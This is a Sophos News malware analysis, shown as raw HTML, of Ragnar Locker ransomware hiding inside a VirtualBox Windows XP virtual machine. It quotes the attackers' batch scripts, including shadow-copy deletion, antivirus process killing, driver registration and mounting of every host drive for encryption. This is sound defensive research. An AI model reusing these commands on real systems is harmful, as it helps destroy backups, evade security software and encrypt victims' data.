<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/" /><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>Ragnar Locker ransomware deploys virtual machine to dodge security &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Ragnar Locker ransomware deploys virtual machine to dodge security Comments Feed" href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??/wp-includes/css/dist/block-library/style.min.css,/wp-content/themes/sophosnews-2017/style.css,/wp-content/mu-plugins/jetpack-9.5/css/jetpack.css?m=1615460090' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZoamxkaGpqXEWAK9AIhg='></script>
<link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/66749" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7" />
<link rel="canonical" href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/" />
<link rel='shortlink' href='https://news.sophos.com/?p=66749' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2020%2F05%2F21%2Fragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2020%2F05%2F21%2Fragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style><link rel="amphtml" href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="Ragnar Locker ransomware deploys virtual machine to dodge security" />
<meta property="og:url" content="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/" />
<meta property="og:description" content="A new ransomware attack method takes defense evasion to a new level—deploying as a full virtual machine on each targeted device to hide the ransomware from view. In a recently detected attack, Ragn…" />
<meta property="article:published_time" content="2020-05-21T11:00:01+00:00" />
<meta property="article:modified_time" content="2020-05-21T16:02:17+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2020/05/1024px-Anglo_-_Viking_Key_Circa_900AD.jpg?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2020/05/1024px-Anglo_-_Viking_Key_Circa_900AD.jpg?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="359" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Ragnar Locker ransomware deploys virtual machine to dodge security" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2020/05/1024px-Anglo_-_Viking_Key_Circa_900AD.jpg?w=640" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="fb:admins" content="28552295016" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-66749 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header">

		<div class="header-container">

			<div class="site-branding">
				<h1 class="site-title">
										<a class="site-logo" href="https://www.sophos.com/en-us.aspx" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- site-branding -->

			<nav class="primary-header-navigation" role="navigation">
				<ul id="menu-en-us-primary" class="menu"><li id="menu-item-33368" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33368"><a href="https://www.sophos.com/en-us/products.aspx">Products<div class="menu-item-description"></div></a></li>
<li id="menu-item-33382" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33382"><a href="https://www.sophos.com/en-us/solutions.aspx">Solutions<div class="menu-item-description"></div></a></li>
<li id="menu-item-33390" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33390"><a href="//www.sophos.com/en-us/partners.aspx">Partners<div class="menu-item-description"></div></a></li>
<li id="menu-item-33391" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33391"><a href="//www.sophos.com/en-us/support.aspx">Support<div class="menu-item-description"></div></a></li>
<li id="menu-item-33392" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33392"><a href="//www.sophos.com/en-us/company.aspx">Company<div class="menu-item-description"></div></a></li>
<li id="menu-item-33393" class="is-icon icon-download menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-33393"><a href="#">Downloads<div class="menu-item-description"></div></a>
<ul class="sub-menu">
	<li id="menu-item-33394" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33394"><a href="//www.sophos.com/en-us/products/free-trials.aspx">Free Trials<div class="menu-item-description">All product trials in one place.</div></a></li>
	<li id="menu-item-33395" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33395"><a href="//www.sophos.com/en-us/products/free-tools.aspx">Free Tools<div class="menu-item-description">Try our tools for use at home.</div></a></li>
	<li id="menu-item-33396" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33396"><a href="//www.sophos.com/en-us/products/request-a-quote.aspx">Get Pricing<div class="menu-item-description">The right price every time.</div></a></li>
</ul>
</li>
<li id="menu-item-33397" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33397"><a href="//www.sophos.com/en-us/search-results.aspx">Search<div class="menu-item-description"></div></a></li>
<li id="menu-item-33398" class="is-icon icon-account menu-item menu-item-type-custom menu-item-object-custom menu-item-33398"><a href="//www.sophos.com/en-us/login.aspx">Sign In<div class="menu-item-description"></div></a></li>
</ul>			</nav>

		</div>
	</header> <!-- site-header -->

	<div class="secondary-header">
		<div class="secondary-header-container container">
			<nav class="secondary-header-navigation" role="navigation">
				<ul id="menu-en-us-secondary" class="menu"><li id="menu-item-33399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33399"><a href="//www.sophos.com/en-us/company.aspx">Overview</a></li>
<li id="menu-item-33401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33401"><a href="//www.sophos.com/en-us/company/press.aspx">Press</a></li>
<li id="menu-item-33402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33402"><a href="//secure2.sophos.com/en-us/company/events.aspx">Events</a></li>
<li id="menu-item-33403" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33403"><a href="//www.sophos.com/en-us/company/community.aspx">Community</a></li>
<li id="menu-item-33404" class="menu-item-blog menu-item menu-item-type-custom menu-item-object-custom menu-item-33404"><a href="/">Blog</a></li>
<li id="menu-item-33405" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33405"><a href="//secure2.sophos.com/en-us/company/careers.aspx">Careers</a></li>
<li id="menu-item-33406" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33406"><a href="//www.sophos.com/en-us/company/contact.aspx">Contact</a></li>
</ul>			</nav>
		</div>
	</div> <!-- secondary-header -->

	<div class="news-header">
		<div class="news-header-container container">

			<div class="news-branding">
				<h1 class="news-title">
					<a class="news-logo" href="https://news.sophos.com/en-us/" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- news-branding -->

			<div class="mobile-menu-toggle">
				<a href="#newsmenu">
											Menu									</a>
			</div>

			<div class="mobile-search-toggle">
				<a class="icon icon-search-secondary" href="#search">
					Search				</a>
			</div>

			<nav class="news-header-navigation" role="navigation">
				<ul id="menu-en-us-tertiary" class="menu"><li id="menu-item-33407" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33407"><a href="#search">Search</a></li>
</ul>			</nav>

			<div class="site-search-block" style="display: none;">
				<form role="search" class="search-form" method="get" action="https://news.sophos.com/en-us/">
					<fieldset>
						<div class="field">
							<input type="text" value="" name="s" class="search-field" placeholder="Search">
						</div>
						<div class="submit">
							<button type="submit" class="search-submit icon icon-search-secondary">
								Go							</button>
						</div>
					</fieldset>
				</form>
				<a class="icon" href="#search-close">
					Close				</a>
			</div>
		</div>
	</div> <!-- news-header -->

	<div id="content" class="site-content">
		<div class="content-container">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-66749" class="post-66749 post type-post status-publish format-standard has-post-thumbnail hentry category-sophoslabs-uncut tag-ragnar-locker-ransomware tag-ransomware region-en-us">

	<header class="entry-header">

		<h1 class="entry-title">Ragnar Locker ransomware deploys virtual machine to dodge security</h1>
		<div class="entry-categories">
			<a href="https://news.sophos.com/en-us/category/sophoslabs/sophoslabs-uncut/">SophosLabs Uncut</a>&bull;<a href="https://news.sophos.com/en-us/tag/ragnar-locker-ransomware/">Ragnar Locker ransomware</a>&bull;<a href="https://news.sophos.com/en-us/tag/ransomware/">Ransomware</a>		</div>

		
		<div class="entry-meta">
			<span class="posted-on"><a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/" rel="bookmark">21 May 2020</a></span>		</div><!-- .entry-meta -->

		<div class="entry-social">
			
	<ul class="social-sharing" id="social-sharing">
		<li class="comments">
			<a href="#comments" title="Leave a Reply">
				43			</a>
		</li>
		<li class="twitter"><a class="js-share-modal" href="http://twitter.com/intent/tweet?text=Ragnar%20Locker%20ransomware%20deploys%20virtual%20machine%20to%20dodge%20security%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D66749" data-title="" title="Share on Twitter">Share on Twitter</a></li>
		<li class="facebook"><a class="js-share-modal" href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=66749&#038;title=Ragnar%20Locker%20ransomware%20deploys%20virtual%20machine%20to%20dodge%20security" data-title="Ragnar Locker ransomware deploys virtual machine to dodge security" title="Share on Facebook">Share on Facebook</a></li>
		<li class="linkedin">
			<a
				href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/"
				data-title="Ragnar Locker ransomware deploys virtual machine to dodge security"
				title="Share on LinkedIn"
				onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
			>
				Share on LinkedIn			</a>
		</li>
	</ul>

			</div><!-- .entry-social -->
	</header><!-- .entry-header -->

		<div class="entry-featured-image">
		<img width="640" height="359" src="https://news.sophos.com/wp-content/uploads/2020/05/1024px-Anglo_-_Viking_Key_Circa_900AD.jpg?w=640" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://news.sophos.com/wp-content/uploads/2020/05/1024px-Anglo_-_Viking_Key_Circa_900AD.jpg 1024w, https://news.sophos.com/wp-content/uploads/2020/05/1024px-Anglo_-_Viking_Key_Circa_900AD.jpg?resize=300,168 300w, https://news.sophos.com/wp-content/uploads/2020/05/1024px-Anglo_-_Viking_Key_Circa_900AD.jpg?resize=768,431 768w" sizes="(max-width: 640px) 100vw, 640px" />	</div> <!-- .featured-image -->
	
	<div class="entry-meta">
		<span class="byline">By <span class="author vcard"><a href="https://news.sophos.com/en-us/author/mark-loman/" title="Posts by Mark Loman" class="author url fn" rel="author">Mark Loman</a></span></span>	</div><!-- .entry-meta -->

	<div class="entry-content">
		<p>A new ransomware attack method takes defense evasion to a new level—deploying as a full virtual machine on each targeted device to hide the ransomware from view. In a recently detected attack, Ragnar Locker ransomware was deployed inside an Oracle VirtualBox Windows XP virtual machine. The attack payload was a 122 MB installer with a 282 MB virtual image inside—all to conceal a 49 kB ransomware executable.</p>
<p>The adversaries behind Ragnar Locker have been known to steal data from targeted networks prior to launching ransomware, to encourage victims to pay. In April, the actors behind Ragnar Locker attacked the network of Energias de Portugal (EDP) and claimed to have stolen 10 terabytes of sensitive company data, demanding a payment of 1,580 Bitcoin (approximately $11 million US) and threatening to release the data if the ransom was not paid.</p>
<p>In past attacks, the Ragnar Locker group has used exploits of managed service providers or attacks on Windows Remote Desktop Protocol (RDP) connections to gain a foothold on targeted networks. After gaining administrator-level access to the domain of a target and exfiltration of data, they have used native Windows administrative tools such as Powershell and Windows Group Policy Objects (GPOs) to move laterally across the network to Windows clients and servers.</p>
<p>In the detected attack, the Ragnar Locker actors used a GPO task to execute Microsoft Installer (msiexec.exe), passing parameters to download and silently install a 122 MB crafted, unsigned MSI package from a remote web server. The primary contents of the MSI package were:</p>
<ul>
<li>A working installation of an old Oracle VirtualBox hypervisor—actually, Sun xVM VirtualBox version 3.0.4 from August 5, 2009 (Oracle bought Sun Microsystems in 2010).</li>
<li>A virtual disk image file (VDI) named micro.vdi— an image of a stripped-down version of the Windows XP SP3 operating system, called MicroXP v0.82. The image includes the 49 kB Ragnar Locker ransomware executable.</li>
</ul>
<p>The virtualization software and the virtual disk image are copied to the folder C:\Program Files (x86)\VirtualAppliances.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/05/rag-vdi-files.jpg"><img loading="lazy" class="alignnone size-large wp-image-66765" src="https://news.sophos.com/wp-content/uploads/2020/05/rag-vdi-files.jpg?w=640" alt="" width="640" height="281" srcset="https://news.sophos.com/wp-content/uploads/2020/05/rag-vdi-files.jpg 914w, https://news.sophos.com/wp-content/uploads/2020/05/rag-vdi-files.jpg?resize=300,132 300w, https://news.sophos.com/wp-content/uploads/2020/05/rag-vdi-files.jpg?resize=768,338 768w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>In addition to the VirtualBox files, the MSI also deploys an executable (called va.exe), a batch file (named install.bat), and a few support files. After completing the installation, the MSI Installer executes va.exe, which in turn runs the install.bat batch script. The script’s first task is to register and run the necessary VirtualBox application extensions VBoxC.dll and VBoxRT.dll, and the VirtualBox driver VboxDrv.sys:</p>
<pre>%binapp%\VBoxSVC.exe /reregserver
regsvr32 /S “%binpath%\VboxC.dll”
rundll32 “%binpath%\VBoxRT.dll,RTR3Init”
sc create VBoxDRV binpath= “%binpath%\drivers\VboxDrv.sys” type= kernel start= auto error= normal displayname= PortableVBoxDRV
sc start VBoxDRV
</pre>
<p>The script then goes on to stop the Windows Shell Hardware Detection service, to disable the Windows AutoPlay notification functionality:</p>
<pre>sc stop ShellHWDetection
</pre>
<p>Next, the script executes a command to delete the targeted PC’s volume shadow copies, so victims cannot restore older unencrypted versions of their files:</p>
<pre>vssadmin delete shadows /all /quiet</pre>
<p>The install.bat script then goes on to enumerate all local disks, connected removable drives and mapped network drives on the physical machine, so they can be configured to be accessed from within the virtual machine:</p>
<pre>mountvol | find “}\” &gt; v.txt

(For /F %%i In (v.txt) Do (
      Set freedrive=0
      FOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
            IF NOT EXIST %%d:\ (
                  IF “!freedrive!”==”0” (
                        Set freedrive=%%d
                  )
            )
      )
      mountvol !freedrive!: %%i
      ping -n 2 127.0.0.1
))
Set driveid=0
FOR %%d IN (C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO (
      IF EXIST %%d:\ (
            Set /a driveid+=1
            echo ^&lt;SharedFolder name=”!driveid!” hostPath=”%%d:\” writable=”true”/^&gt; &gt;&gt;sf.txt
         )
)
</pre>
<p>These commands will write text to the VirtualBox configuration file’s Shared Folders listing, such as:</p>
<pre>&lt;SharedFolders&gt;

&lt;SharedFolder name="1" hostPath="C:\" writable="true"/&gt;

&lt;SharedFolder name="2" hostPath="E:\" writable="true"/&gt;

&lt;/SharedFolders&gt;</pre>
<p>To construct the micro.xml VirtualBox configuration file, required to start the micro.vdi virtual machine, the following commands are executed:</p>
<pre>type vm1.txt &gt; micro.xml

echo ^&lt;CPU count=”1”^&gt; &gt; pn.txt

type pn.txt &gt;&gt; micro.xml

type vm2.txt &gt;&gt; micro.xml

type sf.txt &gt;&gt; micro.xml

type vm3.txt &gt;&gt; micro.xml</pre>
<p>The VM is configured with 256 MB RAM, 1 CPU, a single 299 MB HDD file micro.vdi and an Intel PRO/1000 network adapter attached to NAT.</p>
<p>Now the virtual environment is prepared, the install.bat command goes through a list of process names and terminates these processes so any files they have open are unlocked and become accessible for encryption. This list of 50 entries consists of mainly line-of-business applications, database, remote management and backup applications and is stored in a text file. Another text file contains services names. These are tailored to the victim organization&#8217;s network environment, including process and service names belonging to endpoint protection software.</p>
<p>With the environment properly prepared, the install.bat script starts the virtual machine with this command:</p>
<pre>“%binpath%\VboxHeadless.exe” –startvm micro -v off</pre>
<p>Here’s an illustration of the installation process, captured by Sophos Intercept X:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/05/rag-install.jpg"><img loading="lazy" class="alignnone size-large wp-image-66762" src="https://news.sophos.com/wp-content/uploads/2020/05/rag-install.jpg?w=640" alt="" width="640" height="337" srcset="https://news.sophos.com/wp-content/uploads/2020/05/rag-install.jpg 941w, https://news.sophos.com/wp-content/uploads/2020/05/rag-install.jpg?resize=300,158 300w, https://news.sophos.com/wp-content/uploads/2020/05/rag-install.jpg?resize=768,404 768w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>The following steps can be identified in the root cause analysis (RCA) logs:</p>
<ol>
<li>Microsoft Installer (msiexec.exe) executes</li>
<li>MSI package is downloaded</li>
<li>bat is executed: cmd.exe /c &#8220;C:\Program Files (x86)\VirtualAppliances\install.bat&#8221;</li>
<li>Attempts to terminate Anti-Virus process: taskkill /IM SavService.exe /F</li>
<li>Attempts to stop Anti-Virus service and other processes: sc stop mysql</li>
<li>Mounts accessible networks share to available drive letters: mountvol E: \\?\Volume{174f8ec6-d584-11e9-8afa-806e6f6e6963}\</li>
<li>Starts VirtualBox in headless mode: C:\Program Files (x86)\VirtualAppliances\app64\VBoxHeadless.exe&#8221; &#8211;startvm micro -v off</li>
<li>Deletes shadow copies: vssadmin delete shadows /all /quiet</li>
</ol>
<h3>The Virtual Machine</h3>
<p>As mentioned, the guest VM is a MicroXP edition of the Windows XP operating system and is enclosed in a single file called micro.vdi.</p>
<p>The ransomware executable is found at C:\vrun.exe. The ransomware is compiled exclusively per victim, as the ransom note it drops contains the victim’s name.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/05/rag-vm-file-vrunexe.jpg"><img loading="lazy" class="alignnone size-large wp-image-66766" src="https://news.sophos.com/wp-content/uploads/2020/05/rag-vm-file-vrunexe.jpg?w=640" alt="" width="640" height="308" srcset="https://news.sophos.com/wp-content/uploads/2020/05/rag-vm-file-vrunexe.jpg 831w, https://news.sophos.com/wp-content/uploads/2020/05/rag-vm-file-vrunexe.jpg?resize=300,144 300w, https://news.sophos.com/wp-content/uploads/2020/05/rag-vm-file-vrunexe.jpg?resize=768,370 768w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>To start the ransomware, a batch file called vrun.bat is located in C:\Documents and Settings\Administrator\Start Menu\Programs\Startup\.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/05/Rag-startup-bat-vmjpg.jpg"><img loading="lazy" class="alignnone wp-image-66764 size-large" src="https://news.sophos.com/wp-content/uploads/2020/05/Rag-startup-bat-vmjpg-e1590003138718.jpg?w=612" alt="" width="612" height="224" srcset="https://news.sophos.com/wp-content/uploads/2020/05/Rag-startup-bat-vmjpg-e1590003138718.jpg 612w, https://news.sophos.com/wp-content/uploads/2020/05/Rag-startup-bat-vmjpg-e1590003138718.jpg?resize=300,110 300w" sizes="(max-width: 612px) 100vw, 612px" /></a></p>
<p>This batch file contains the following commands:</p>
<pre>@echo off
ping -n 11 127.0.0.1
net use E: \\VBOXSVR\1
for %%d in (2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33) do (if exist \\VBOXSVR\%%d net use *\\VBOXSVR\%%d)
:a
ping -n 3 127.0.0.1
C:\vrun.exe -vm
goto a</pre>
<p>&nbsp;</p>
<p>This script mounts the shared drives configured in micro.xml on the host machine, inside the guest VM. This means that the ransomware in the guest environment can now fully access the host’s local disks, mapped network and removable drives. Now all drives are mounted, the ransomware vrun.exe is executed.<br />
The vrun.exe ransomware program has a couple of possible command line options:</p>
<ul>
<li>-backup</li>
<li>-list</li>
<li>-force</li>
<li>-vm</li>
</ul>
<p>The last one is used by this setup, and in this mode the ransomware encrypts the files on all available mapped network drives.</p>
<p>Then the ransomware drops the customized ransom note:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2020/05/Rag_ransom-note-cropped.jpg"><img loading="lazy" class="alignnone size-large wp-image-66776" src="https://news.sophos.com/wp-content/uploads/2020/05/Rag_ransom-note-cropped.jpg?w=640" alt="" width="640" height="103" srcset="https://news.sophos.com/wp-content/uploads/2020/05/Rag_ransom-note-cropped.jpg 860w, https://news.sophos.com/wp-content/uploads/2020/05/Rag_ransom-note-cropped.jpg?resize=300,48 300w, https://news.sophos.com/wp-content/uploads/2020/05/Rag_ransom-note-cropped.jpg?resize=768,124 768w" sizes="(max-width: 640px) 100vw, 640px" /></a><br />
<a href="https://news.sophos.com/wp-content/uploads/2020/05/ransom_note_2_cropped.jpg"><img loading="lazy" class="alignnone size-large wp-image-66777" src="https://news.sophos.com/wp-content/uploads/2020/05/ransom_note_2_cropped.jpg?w=640" alt="" width="640" height="202" srcset="https://news.sophos.com/wp-content/uploads/2020/05/ransom_note_2_cropped.jpg 939w, https://news.sophos.com/wp-content/uploads/2020/05/ransom_note_2_cropped.jpg?resize=300,95 300w, https://news.sophos.com/wp-content/uploads/2020/05/ransom_note_2_cropped.jpg?resize=768,243 768w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Since the vrun.exe ransomware application runs inside the virtual guest machine, its process and behaviors can run unhindered, because they’re out of reach for security software on the physical host machine. The data on disks and drives accessible on the physical machine are attacked by the “legitimate” VboxHeadless.exe process, the VirtualBox virtualization software.</p>
<h3>Acknowledgments</h3>
<p>The following Sophos staff contributed to this report:</p>
<ul>
<li>Vikas Singh</li>
<li>Gabor Szappanos</li>
<li>Mark Loman</li>
</ul>
<p>&nbsp;</p>
			</div><!-- .entry-content -->

</article><!-- #post-## -->

					<nav class="navigation post-navigation" role="navigation">
			<h2 class="screen-reader-text">Post navigation</h2>
			<div class="nav-links">
	   			<div class="nav-previous">
											<span class="nav-label">Prev</span>
						<a href="https://news.sophos.com/en-us/2020/05/14/raticate/" rel="prev">RATicate: an attacker&#039;s waves of information-stealing malware</a>
						   			</div>
	   			<div class="nav-next">
											<span class="nav-label">Next</span>
						<a href="https://news.sophos.com/en-us/2020/05/21/asnarok2/" rel="next">Asnarök attackers twice modified attack midstream</a>
						   			</div>
		 	</div><!-- .nav-links -->
		</nav><!-- .navigation -->
		
			<div class="article-author-block article-co-authors-block">
	
					<h2 class="author-title">
				About the Author			</h2>
		
					<div class="author-block-container">
				<div class="author-profile">
					<img width="145" height="145" src="https://news.sophos.com/wp-content/uploads/2020/02/mark-loman.png?w=145" class="avatar avatar-145 photo wp-post-image" alt="" />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/mark-loman/" title="Posts by Mark Loman" class="author url fn" rel="author">Mark Loman</a></h3>

					
					<div class="author-bio">
						<p>Mark Loman is a Director, Engineering, for Next-Gen Technologies at Sophos. As an ethical hacker with a passion for information security, Loman oversees a team of experienced developers responsible for delivering practical signature-less solutions. With more than 10 years of experience, Loman has a keen eye for innovating effective solutions and technology that stop zero-day cyberthreats. With in-depth knowledge of the intricate workings of modern computers and applications, Loman’s team isn’t shy when applying unconventional methods to test and create prevention techniques to battle even persistent attackers.</p>
					</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
			</div>

			
<div id="comments" class="comments-area">

	
			<h2 class="comments-title">
			<span>43</span> Comments		</h2>

		<section class="comments-list">
		<article class="comment even thread-even depth-1 parent " id="comment-187339" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Helen Bou											</h2>
					<time class="comment-meta-item" datetime="2020-05-21T19:06-04:00" itemprop="datePublished"><a href="#comment-187339" itemprop="url">21 May 2020 at 7:06 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
